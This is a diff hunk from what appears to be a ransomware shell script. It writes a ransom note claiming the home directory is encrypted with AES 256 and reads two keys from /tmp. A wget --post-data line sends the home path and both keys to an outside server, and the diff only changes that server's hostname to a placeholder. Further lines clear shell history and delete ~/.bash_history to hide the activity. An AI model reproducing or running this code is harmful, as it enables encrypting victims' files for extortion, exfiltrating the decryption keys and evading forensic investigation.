@@ -7,7 +7,7 @@ echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
 l=`cat /tmp/AesKey1.txt`
 m=`cat /tmp/AesKey2.txt`
 hd=`echo ~/`
-wget --post-data "dir=$hd&Key1=$l&key2=$m" http://oshitwaddup.pe.hu/post.php > /dev/null 2>&1
+wget --post-data "dir=$hd&Key1=$l&key2=$m" http://youwebsite.com/post.php > /dev/null 2>&1
 history -c > /dev/null 2>&1
 history -w > /dev/null 2>&1
 rm ~/.bash_history > /dev/null 2>&1
